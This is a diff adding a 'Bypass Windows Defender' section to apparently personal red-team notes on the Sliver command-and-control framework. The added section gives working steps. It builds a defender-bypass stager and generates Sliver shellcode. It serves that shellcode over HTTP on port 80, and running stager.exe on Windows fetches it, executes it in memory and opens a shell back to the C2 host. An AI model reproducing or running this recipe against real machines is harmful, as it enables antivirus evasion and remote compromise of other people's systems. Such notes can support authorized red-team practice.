@@ -147,7 +147,22 @@ The size of dropper is significantly lower that stageless implant.
 > For some reason, for me, staged payloads is not working. Here's the docs for it: https://sliver.sh/docs/?name=Stagers and here's another good blog about it https://dominicbreuker.com/post/learning_sliver_c2_06_stagers/
 
 
+## Bypass Windows Defender
+Clone this repo: https://github.com/TeneBrae93/defender_bypass_with_sliver
+From defender bypass directory run: `python3 builder.py -l 192.168.133.128 -p 80`
+From Sliver shell:
+- generate a stager at port 443: `generate --mtls 192.168.133.128:443 --os windows --arch amd64 --format shellcode`
+- It will generate `.bin` file use `mv <generated>.bin shellc.bin` in defender bypass directory
+- Start job from sliver `mtls -L <C2_IP/192.168.133.128> -l <stager_port/443>`
+- Start web server on port 80: `python3 -m http.server 80`
+- Transfer `stager.exe` to windows and execute it.
 
+What it will do it, after executing `stager.exe`, it will fetch `shellc.bin` from port 80 and it will execute that in-memory and will give us the shell.
+
+From Windows:
+![[Pasted image 20260720121227.png]]
+From C2:
+![[Pasted image 20260720121305.png]]
 
 Good Resources
 - https://redsiege.com/blog/2022/11/introduction-to-sliver/
